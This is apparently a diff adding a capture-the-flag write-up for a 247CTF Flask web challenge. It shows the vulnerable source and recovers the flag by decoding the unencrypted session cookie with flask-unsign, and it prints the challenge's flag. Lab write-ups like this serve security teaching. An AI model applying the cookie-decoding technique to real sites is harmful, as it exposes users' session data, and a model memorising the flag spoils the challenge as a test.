@@ -1,0 +1,55 @@
+247CTF{da80795f8a5cab2e037d7385807b9a91}
+
+
+Open up the website and we see this code:
+
+import os
+from flask import Flask, request, session
+from flag import flag
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+
+def secret_key_to_int(s):
+    try:
+        secret_key = int(s)
+    except ValueError:
+        secret_key = 0
+    return secret_key
+
+@app.route("/flag")
+def index():
+    secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
+    session['flag'] = flag
+    if secret_key == app.config['SECRET_KEY']:
+      return session['flag']
+    else:
+      return "Incorrect secret key!"
+
+@app.route('/')
+def source():
+    return "
+
+%s
+
+" % open(__file__).read()
+
+if __name__ == "__main__":
+    app.run()
+
+
+So this is some sort of Flask server serving this application.
+When we go to /flag, it checks if the secret_key argument in our request is the same as the app's secret key, and if it is,
+it will return the flag from the session cookie.
+
+We go to /flag and look at the network tab in devtools and check out the session cookie's value:
+eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.ZghH5Q.uPV2lfeTlPBTYLK-8XCea0wHhF4
+
+we can use the following command to decode this cookie:
+$ flask-unsign --decode --cookie 'eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.ZghH5Q.uPV2lfeTlPBTYLK-8XCea0wHhF4'
+{'flag': b'247CTF{da80795f8a5cab2e037d7385807b9a91}'}
+
+so that's our flag right there.
+
+links:
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask
